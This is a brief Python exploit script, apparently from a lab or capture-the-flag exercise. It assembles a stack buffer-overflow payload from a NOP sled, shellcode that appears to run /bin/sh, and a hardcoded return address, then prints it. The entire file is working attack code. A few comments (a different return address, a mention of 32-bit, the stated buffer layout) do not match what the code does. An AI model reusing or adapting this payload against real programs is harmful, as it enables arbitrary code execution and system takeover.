#!/usr/bin/python


retAddrOffset=76
buf=""
shellOut="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode="\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"


#shell starts at ffff:d0b0
#so return address = \x90\x4a\xe0\xff

#Address space of 32 bit arch is 4 bytes


NOPSled="\x90"*(retAddrOffset-len(shellOut))

NOPOut="\\x90"*(retAddrOffset-len(shellOut))

#This is the address of the shellcode.
#The design is shellcode||NOP||rettoShellstart<---|
#              ^----------------------/

retAddr="\xb0\xd0\xff\xff"
retOut = "\\xb0\\xd0\\xff\\xff"

buf=NOPSled+shellOut+retAddr
bufOut= NOPOut+shellcode+retOut

#This may have chars improperly displayed by the STDOUT. Pipe the output to a file and open it using an editor which
#supports the unicode characters like vim
print buf
